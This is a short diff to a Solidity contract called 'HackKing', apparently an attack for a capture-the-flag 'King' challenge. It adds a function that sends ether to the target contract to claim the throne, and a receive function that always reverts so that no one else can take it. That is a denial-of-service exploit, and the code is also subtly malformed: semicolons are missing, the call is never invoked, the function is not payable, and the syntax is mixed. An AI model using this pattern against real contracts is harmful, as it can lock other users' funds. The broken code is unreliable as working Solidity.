@@ -8,8 +8,12 @@ contract HackKing {
     kingContract = _kingContract
   }
 
-  function crownMe() {
+  function crownMe(uint value) {
+    address(kingContract).call.value(value)
+  }
 
+  receive() external payable {
+    revert()
   }
 
 }
